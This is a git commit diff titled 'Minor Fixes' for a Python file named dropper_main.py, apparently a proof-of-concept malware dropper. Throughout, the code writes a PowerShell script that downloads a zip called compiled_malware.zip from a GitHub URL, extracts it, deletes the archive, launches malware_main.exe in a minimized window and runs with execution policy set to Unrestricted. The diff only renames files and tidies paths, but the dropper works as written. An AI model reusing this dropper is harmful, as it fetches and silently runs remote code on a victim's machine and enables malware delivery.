b1ac5d94401b0bf4f4cf5f9bf4d23e9f79913f60
Guilherme Bacellar Moralez <guibacellar@gmail.com>
2020-12-11 16:02:28 -0300

    Minor Fixes
    Signed-off-by: Guilherme Bacellar Moralez <guibacellar@gmail.com>

--- dropper_main.py
+++ dropper_main.py
@@ -3,8 +3,8 @@ import subprocess
 import tempfile
 import uuid
 
-t = tempfile.gettempdir() + uuid.uuid4().hex + ".ps1"
-malware_url = "https://github.com/guibacellar/downloadable_pocs/raw/main/poc001.zip"
+t = f'{tempfile.gettempdir()}/{uuid.uuid4().hex}.ps1'
+malware_url = "https://github.com/guibacellar/downloadable_pocs/raw/main/pre_compiled_assets/compiled_malware.zip"
 
 with open(t, 'w') as fs:
     fs.write(
@@ -18,11 +18,12 @@ $WebClient = New-Object System.Net.WebClient
 $WebClient.DownloadFile("{malware_url}","malware.zip")
 [System.IO.Compression.ZipFile]::ExtractToDirectory("malware.zip", $tempFolderPath);
 Remove-Item "malware.zip"
-Start-Process -FilePath "$tempFolderPath/main.exe" -WindowStyle Minimized
+Start-Process -FilePath "$tempFolderPath/malware_main.exe" -WindowStyle Minimized
         '''
     )
     fs.flush()
     os.fsync(fs.fileno())
     fs.close()
 
-subprocess.run(["powershell", "-ExecutionPolicy", "Unrestricted", "-File", t])
+
+subprocess.run(["powershell", "-ExecutionPolicy", "Unrestricted", "-File", f"{t}"])
